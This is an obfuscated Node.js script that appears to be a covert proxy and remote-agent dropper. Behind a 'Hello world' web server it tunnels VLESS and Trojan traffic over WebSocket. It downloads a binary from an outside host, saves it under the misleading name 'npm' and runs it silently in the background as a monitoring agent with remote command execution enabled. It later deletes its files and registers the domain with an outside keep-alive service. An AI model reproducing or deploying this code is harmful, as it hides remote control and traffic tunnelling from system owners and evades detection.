const _0x1f288e=_0x51d4;(function(_0x19b203,_0x5a3a62){const _0xff8753=_0x51d4,_0x1f3915=_0x19b203();while(!![]){try{const _0x3291ff=parseInt(_0xff8753(0x228))/0x1+-parseInt(_0xff8753(0x20a))/0x2*(-parseInt(_0xff8753(0x202))/0x3)+parseInt(_0xff8753(0x236))/0x4*(-parseInt(_0xff8753(0x227))/0x5)+-parseInt(_0xff8753(0x23e))/0x6*(parseInt(_0xff8753(0x252))/0x7)+parseInt(_0xff8753(0x204))/0x8+parseInt(_0xff8753(0x269))/0x9*(-parseInt(_0xff8753(0x246))/0xa)+parseInt(_0xff8753(0x26b))/0xb;if(_0x3291ff===_0x5a3a62)break;else _0x1f3915['push'](_0x1f3915['shift']());}catch(_0x2fcafa){_0x1f3915['push'](_0x1f3915['shift']());}}}(_0x3a2f,0x3bcda));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x1f288e(0x22d)),net=require(_0x1f288e(0x264)),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1f288e(0x220)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1f288e(0x242)][_0x1f288e(0x234)]||_0x1f288e(0x217),NEZHA_SERVER=process[_0x1f288e(0x242)][_0x1f288e(0x218)]||'',NEZHA_PORT=process[_0x1f288e(0x242)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x1f288e(0x212)]||'',DOMAIN=process['env'][_0x1f288e(0x23a)]||_0x1f288e(0x1f6),AUTO_ACCESS=process[_0x1f288e(0x242)][_0x1f288e(0x22f)]||!![],WSPATH=process[_0x1f288e(0x242)][_0x1f288e(0x24d)]||UUID[_0x1f288e(0x205)](0x0,0x8),SUB_PATH=process[_0x1f288e(0x242)][_0x1f288e(0x229)]||_0x1f288e(0x262),NAME=process[_0x1f288e(0x242)][_0x1f288e(0x243)]||'',PORT=process[_0x1f288e(0x242)][_0x1f288e(0x251)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0xe6c85a=_0x1f288e;try{const _0x2c3c5f=await axios[_0xe6c85a(0x211)]('https://api.ip.sb/geoip'),_0x51ae34=_0x2c3c5f[_0xe6c85a(0x254)];ISP=(_0x51ae34[_0xe6c85a(0x245)]+'-'+_0x51ae34[_0xe6c85a(0x1f2)])['replace'](/ /g,'_');}catch(_0x46b824){ISP=_0xe6c85a(0x25e);}};GetISP();const httpServer=http['createServer']((_0x155221,_0x385e36)=>{const _0x26c77a=_0x1f288e;if(_0x155221[_0x26c77a(0x233)]==='/'){const _0x298c8b=path[_0x26c77a(0x1fa)](__dirname,'index.html');fs[_0x26c77a(0x240)](_0x298c8b,_0x26c77a(0x259),(_0x37181f,_0x5be5ca)=>{const _0xcc5dca=_0x26c77a;if(_0x37181f){_0x385e36[_0xcc5dca(0x23d)](0xc8,{'Content-Type':'text/html'}),_0x385e36[_0xcc5dca(0x244)]('Hello\x20world!');return;}_0x385e36[_0xcc5dca(0x23d)](0xc8,{'Content-Type':_0xcc5dca(0x255)}),_0x385e36[_0xcc5dca(0x244)](_0x5be5ca);});return;}else{if(_0x155221[_0x26c77a(0x233)]==='/'+SUB_PATH){const _0x318ec6=NAME?NAME+'-'+ISP:ISP,_0x3deeed=_0x26c77a(0x230)+UUID+'@'+DOMAIN+_0x26c77a(0x263)+DOMAIN+_0x26c77a(0x24e)+DOMAIN+_0x26c77a(0x1fb)+WSPATH+'#'+_0x318ec6,_0x33ae7b=_0x26c77a(0x1f5)+UUID+'@'+DOMAIN+_0x26c77a(0x248)+DOMAIN+_0x26c77a(0x24e)+DOMAIN+_0x26c77a(0x1fb)+WSPATH+'#'+_0x318ec6,_0x1e6a5f=_0x3deeed+'\x0a'+_0x33ae7b,_0x1a324e=Buffer[_0x26c77a(0x267)](_0x1e6a5f)[_0x26c77a(0x206)](_0x26c77a(0x1fc));_0x385e36[_0x26c77a(0x23d)](0xc8,{'Content-Type':_0x26c77a(0x268)}),_0x385e36[_0x26c77a(0x244)](_0x1a324e+'\x0a');}else _0x385e36[_0x26c77a(0x23d)](0x194,{'Content-Type':'text/plain'}),_0x385e36[_0x26c77a(0x244)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x1f288e(0x24b))]({'server':httpServer}),uuid=UUID[_0x1f288e(0x213)](/-/g,''),DNS_SERVERS=[_0x1f288e(0x200),_0x1f288e(0x1f0)];function resolveHost(_0x515121){return new Promise((_0x1fccd7,_0x47a9d0)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x515121)){_0x1fccd7(_0x515121);return;}let _0x5dc3b0=0x0;function _0xa9a4d3(){const _0x16b0ed=_0x51d4;if(_0x5dc3b0>=DNS_SERVERS[_0x16b0ed(0x23c)]){_0x47a9d0(new Error(_0x16b0ed(0x265)+_0x515121+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1e8710=DNS_SERVERS[_0x5dc3b0];_0x5dc3b0++;const _0x56d557=_0x16b0ed(0x221)+encodeURIComponent(_0x515121)+'&type=A';axios[_0x16b0ed(0x211)](_0x56d557,{'timeout':0x1388,'headers':{'Accept':_0x16b0ed(0x25b)}})[_0x16b0ed(0x22e)](_0x1723a6=>{const _0x46ed08=_0x16b0ed,_0x2d7471=_0x1723a6[_0x46ed08(0x254)];if(_0x2d7471[_0x46ed08(0x241)]===0x0&&_0x2d7471[_0x46ed08(0x22b)]&&_0x2d7471[_0x46ed08(0x22b)][_0x46ed08(0x23c)]>0x0){const _0x14ac3e=_0x2d7471[_0x46ed08(0x22b)]['find'](_0x4918b4=>_0x4918b4[_0x46ed08(0x210)]===0x1);if(_0x14ac3e){_0x1fccd7(_0x14ac3e[_0x46ed08(0x254)]);return;}}_0xa9a4d3();})['catch'](_0x6ffd9b=>{_0xa9a4d3();});}_0xa9a4d3();});}function handleVlessConnection(_0x24dd04,_0x33f188){const _0x28faad=_0x1f288e,[_0x2e2ca4]=_0x33f188,_0x5975ce=_0x33f188['slice'](0x1,0x11);if(!_0x5975ce['every']((_0x1cf9f4,_0x146fd4)=>_0x1cf9f4==parseInt(uuid[_0x28faad(0x25f)](_0x146fd4*0x2,0x2),0x10)))return![];let _0x554fe=_0x33f188['slice'](0x11,0x12)[_0x28faad(0x24c)]()+0x13;const _0x3f2c66=_0x33f188['slice'](_0x554fe,_0x554fe+=0x2)[_0x28faad(0x1f1)](0x0),_0x287b56=_0x33f188['slice'](_0x554fe,_0x554fe+=0x1)[_0x28faad(0x24c)](),_0x138947=_0x287b56==0x1?_0x33f188['slice'](_0x554fe,_0x554fe+=0x4)[_0x28faad(0x1fa)]('.'):_0x287b56==0x2?new TextDecoder()[_0x28faad(0x208)](_0x33f188[_0x28faad(0x205)](_0x554fe+0x1,_0x554fe+=0x1+_0x33f188[_0x28faad(0x205)](_0x554fe,_0x554fe+0x1)[_0x28faad(0x24c)]())):_0x287b56==0x3?_0x33f188['slice'](_0x554fe,_0x554fe+=0x10)['reduce']((_0x53c065,_0x5a9ea9,_0x1b7809,_0x515b25)=>_0x1b7809%0x2?_0x53c065[_0x28faad(0x26a)](_0x515b25[_0x28faad(0x205)](_0x1b7809-0x1,_0x1b7809+0x1)):_0x53c065,[])[_0x28faad(0x237)](_0x1f43f9=>_0x1f43f9[_0x28faad(0x1f1)](0x0)[_0x28faad(0x206)](0x10))[_0x28faad(0x1fa)](':'):'';_0x24dd04[_0x28faad(0x214)](new Uint8Array([_0x2e2ca4,0x0]));const _0x2e2f72=createWebSocketStream(_0x24dd04);return resolveHost(_0x138947)[_0x28faad(0x22e)](_0x314558=>{const _0x2e25f5=_0x28faad;net[_0x2e25f5(0x24f)]({'host':_0x314558,'port':_0x3f2c66},function(){const _0x4aee33=_0x2e25f5;this[_0x4aee33(0x216)](_0x33f188[_0x4aee33(0x205)](_0x554fe)),_0x2e2f72['on'](_0x4aee33(0x21f),()=>{})[_0x4aee33(0x1fd)](this)['on'](_0x4aee33(0x21f),()=>{})['pipe'](_0x2e2f72);})['on']('error',()=>{});})[_0x28faad(0x207)](_0x8bb842=>{const _0x175889=_0x28faad;net[_0x175889(0x24f)]({'host':_0x138947,'port':_0x3f2c66},function(){const _0x46a106=_0x175889;this[_0x46a106(0x216)](_0x33f188[_0x46a106(0x205)](_0x554fe)),_0x2e2f72['on'](_0x46a106(0x21f),()=>{})[_0x46a106(0x1fd)](this)['on'](_0x46a106(0x21f),()=>{})[_0x46a106(0x1fd)](_0x2e2f72);})['on']('error',()=>{});}),!![];}function _0x51d4(_0x1f18b1,_0xfb4d3){_0x1f18b1=_0x1f18b1-0x1ee;const _0x3a2f92=_0x3a2f();let _0x51d46b=_0x3a2f92[_0x1f18b1];return _0x51d46b;}function handleTrojanConnection(_0x3edd04,_0x712196){const _0x59a91f=_0x1f288e;try{if(_0x712196[_0x59a91f(0x23c)]<0x3a)return![];const _0x34540d=_0x712196[_0x59a91f(0x205)](0x0,0x38)[_0x59a91f(0x206)](),_0x2b34c3=[UUID];let _0xe9f853=null;for(const _0x23d711 of _0x2b34c3){const _0x59736f=crypto[_0x59a91f(0x23f)](_0x59a91f(0x25a))['update'](_0x23d711)[_0x59a91f(0x256)](_0x59a91f(0x20d));if(_0x59736f===_0x34540d){_0xe9f853=_0x23d711;break;}}if(!_0xe9f853)return![];let _0x5a38da=0x38;_0x712196[_0x5a38da]===0xd&&_0x712196[_0x5a38da+0x1]===0xa&&(_0x5a38da+=0x2);const _0xa1a49d=_0x712196[_0x5a38da];if(_0xa1a49d!==0x1)return![];_0x5a38da+=0x1;const _0x2b41a4=_0x712196[_0x5a38da];_0x5a38da+=0x1;let _0x118273,_0x4cf0aa;if(_0x2b41a4===0x1)_0x118273=_0x712196[_0x59a91f(0x205)](_0x5a38da,_0x5a38da+0x4)[_0x59a91f(0x1fa)]('.'),_0x5a38da+=0x4;else{if(_0x2b41a4===0x3){const _0x4d91c7=_0x712196[_0x5a38da];_0x5a38da+=0x1,_0x118273=_0x712196[_0x59a91f(0x205)](_0x5a38da,_0x5a38da+_0x4d91c7)[_0x59a91f(0x206)](),_0x5a38da+=_0x4d91c7;}else{if(_0x2b41a4===0x4)_0x118273=_0x712196['slice'](_0x5a38da,_0x5a38da+0x10)[_0x59a91f(0x21e)]((_0x118cba,_0x58ee59,_0x35f183,_0x5923df)=>_0x35f183%0x2?_0x118cba[_0x59a91f(0x26a)](_0x5923df[_0x59a91f(0x205)](_0x35f183-0x1,_0x35f183+0x1)):_0x118cba,[])[_0x59a91f(0x237)](_0x530337=>_0x530337[_0x59a91f(0x1f1)](0x0)[_0x59a91f(0x206)](0x10))[_0x59a91f(0x1fa)](':'),_0x5a38da+=0x10;else return![];}}_0x4cf0aa=_0x712196[_0x59a91f(0x1f1)](_0x5a38da),_0x5a38da+=0x2;_0x5a38da<_0x712196[_0x59a91f(0x23c)]&&_0x712196[_0x5a38da]===0xd&&_0x712196[_0x5a38da+0x1]===0xa&&(_0x5a38da+=0x2);const _0x168e9d=createWebSocketStream(_0x3edd04);return resolveHost(_0x118273)[_0x59a91f(0x22e)](_0x399293=>{const _0x3a3fe4=_0x59a91f;net[_0x3a3fe4(0x24f)]({'host':_0x399293,'port':_0x4cf0aa},function(){const _0x330bac=_0x3a3fe4;_0x5a38da<_0x712196['length']&&this[_0x330bac(0x216)](_0x712196['slice'](_0x5a38da)),_0x168e9d['on'](_0x330bac(0x21f),()=>{})[_0x330bac(0x1fd)](this)['on']('error',()=>{})[_0x330bac(0x1fd)](_0x168e9d);})['on'](_0x3a3fe4(0x21f),()=>{});})['catch'](_0x17cacf=>{const _0x43acc4=_0x59a91f;net[_0x43acc4(0x24f)]({'host':_0x118273,'port':_0x4cf0aa},function(){const _0x296bed=_0x43acc4;_0x5a38da<_0x712196['length']&&this[_0x296bed(0x216)](_0x712196[_0x296bed(0x205)](_0x5a38da)),_0x168e9d['on']('error',()=>{})[_0x296bed(0x1fd)](this)['on']('error',()=>{})['pipe'](_0x168e9d);})['on'](_0x43acc4(0x21f),()=>{});}),!![];}catch(_0x4b38e4){return![];}}wss['on'](_0x1f288e(0x21b),(_0x476edb,_0x3089db)=>{const _0x512087=_0x1f288e,_0x45fbbc=_0x3089db['url']||'';_0x476edb[_0x512087(0x226)](_0x512087(0x24a),_0x34735a=>{const _0x4b479e=_0x512087;if(_0x34735a['length']>0x11&&_0x34735a[0x0]===0x0){const _0x184936=_0x34735a[_0x4b479e(0x205)](0x1,0x11),_0x514f54=_0x184936[_0x4b479e(0x20e)]((_0x3c3a67,_0x478a63)=>_0x3c3a67==parseInt(uuid[_0x4b479e(0x25f)](_0x478a63*0x2,0x2),0x10));if(_0x514f54){!handleVlessConnection(_0x476edb,_0x34735a)&&_0x476edb[_0x4b479e(0x1ff)]();return;}}!handleTrojanConnection(_0x476edb,_0x34735a)&&_0x476edb[_0x4b479e(0x1ff)]();})['on'](_0x512087(0x21f),()=>{});});const getDownloadUrl=()=>{const _0x2dbbab=_0x1f288e,_0x249a53=os[_0x2dbbab(0x209)]();return _0x249a53==='arm'||_0x249a53===_0x2dbbab(0x1ef)||_0x249a53===_0x2dbbab(0x22a)?!NEZHA_PORT?_0x2dbbab(0x232):_0x2dbbab(0x260):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x27b77d=_0x1f288e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3d0193=getDownloadUrl(),_0x37390d=await axios({'method':_0x27b77d(0x211),'url':_0x3d0193,'responseType':_0x27b77d(0x1fe)}),_0x72a123=fs[_0x27b77d(0x1f7)](_0x27b77d(0x253));return _0x37390d[_0x27b77d(0x254)][_0x27b77d(0x1fd)](_0x72a123),new Promise((_0x50d1f1,_0xbc9224)=>{const _0xb5b8ed=_0x27b77d;_0x72a123['on'](_0xb5b8ed(0x23b),()=>{const _0xf764fa=_0xb5b8ed;console[_0xf764fa(0x250)](_0xf764fa(0x1f4)),exec('chmod\x20+x\x20npm',_0xa06c9=>{if(_0xa06c9)_0xbc9224(_0xa06c9);_0x50d1f1();});}),_0x72a123['on'](_0xb5b8ed(0x21f),_0xbc9224);});}catch(_0x2847b6){throw _0x2847b6;}},runnz=async()=>{const _0x28303d=_0x1f288e;try{const _0x590b2e=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x590b2e[_0x28303d(0x223)]()!==''){console[_0x28303d(0x250)](_0x28303d(0x201));return;}}catch(_0x4c4d56){}await downloadFile();let _0x66599d='',_0xf3d3c2=[_0x28303d(0x249),'8443',_0x28303d(0x203),_0x28303d(0x257),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3a72ac=_0xf3d3c2[_0x28303d(0x21c)](NEZHA_PORT)?_0x28303d(0x222):'';_0x66599d=_0x28303d(0x266)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3a72ac+_0x28303d(0x22c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x166264=NEZHA_SERVER[_0x28303d(0x21c)](':')?NEZHA_SERVER[_0x28303d(0x20f)](':')[_0x28303d(0x239)]():'',_0x965818=_0xf3d3c2[_0x28303d(0x21c)](_0x166264)?_0x28303d(0x238):_0x28303d(0x231),_0x1460f3='client_secret:\x20'+NEZHA_KEY+_0x28303d(0x21d)+NEZHA_SERVER+_0x28303d(0x25c)+_0x965818+_0x28303d(0x224)+UUID;fs[_0x28303d(0x225)](_0x28303d(0x215),_0x1460f3);}_0x66599d=_0x28303d(0x219);}else{console[_0x28303d(0x250)](_0x28303d(0x1f9));return;}}try{exec(_0x66599d,{'shell':_0x28303d(0x1ee)},_0x3ce2ab=>{const _0x102e95=_0x28303d;if(_0x3ce2ab)console[_0x102e95(0x21f)](_0x102e95(0x1f8),_0x3ce2ab);else console['log'](_0x102e95(0x20c));});}catch(_0xa988fe){console[_0x28303d(0x21f)](_0x28303d(0x235)+_0xa988fe);}};function _0x3a2f(){const _0xc4c58c=['trim','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','writeFileSync','once','48155jrrpQM','278836CGfxqc','SUB_PATH','aarch64','Answer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','axios','then','AUTO_ACCESS','vless://','false','https://arm64.ssss.nyc.mn/v1','url','UUID','error:\x20','68xYFySG','map','true','pop','DOMAIN','finish','length','writeHead','6HrZSLM','createHash','readFile','Status','env','NAME','end','country_code','970ewOUrh','Server\x20is\x20running\x20on\x20port\x20',':443?security=tls&sni=','443','message','Server','readUInt8','WSPATH','&fp=chrome&type=ws&host=','connect','log','PORT','309281iRTdTv','npm','data','text/html','digest','2087','application/json','utf8','sha224','application/dns-json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','Unknown','substr','https://arm64.ssss.nyc.mn/agent','listen','subpth',':443?encryption=none&security=tls&sni=','net','Failed\x20to\x20resolve\x20','setsid\x20nohup\x20./npm\x20-s\x20','from','text/plain','29151GUJNns','concat','1200243HHeuQc','/bin/bash','arm64','1.1.1.1','readUInt16BE','isp','https://','npm\x20download\x20successfully','trojan://','1234.abc.com','createWriteStream','npm\x20running\x20error:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','join','&path=%2F','base64','pipe','stream','close','8.8.4.4','npm\x20is\x20already\x20running,\x20skip\x20running...','28020YVefgA','2096','940624tqeQgW','slice','toString','catch','decode','arch','56ZVTbET','Automatic\x20Access\x20Task\x20added\x20successfully','npm\x20is\x20running','hex','every','split','type','get','NEZHA_KEY','replace','send','config.yaml','write','e0525a0a-89b6-4a37-96d3-4277f375fad9','NEZHA_SERVER','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','post','connection','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','reduce','error','child_process','https://dns.google/resolve?name=','--tls'];_0x3a2f=function(){return _0xc4c58c;};return _0x3a2f();}async function addAccessTask(){const _0xadf34a=_0x1f288e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3851b0=_0xadf34a(0x1f3)+DOMAIN;try{const _0x38ff18=await axios[_0xadf34a(0x21a)]('https://oooo.serv00.net/add-url',{'url':_0x3851b0},{'headers':{'Content-Type':_0xadf34a(0x258)}});console[_0xadf34a(0x250)](_0xadf34a(0x20b));}catch(_0x2ed090){}}const delFiles=()=>{const _0x3aa597=_0x1f288e;fs[_0x3aa597(0x25d)]('npm',()=>{}),fs[_0x3aa597(0x25d)](_0x3aa597(0x215),()=>{});};httpServer[_0x1f288e(0x261)](PORT,()=>{const _0x274e67=_0x1f288e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x274e67(0x247)+PORT);});
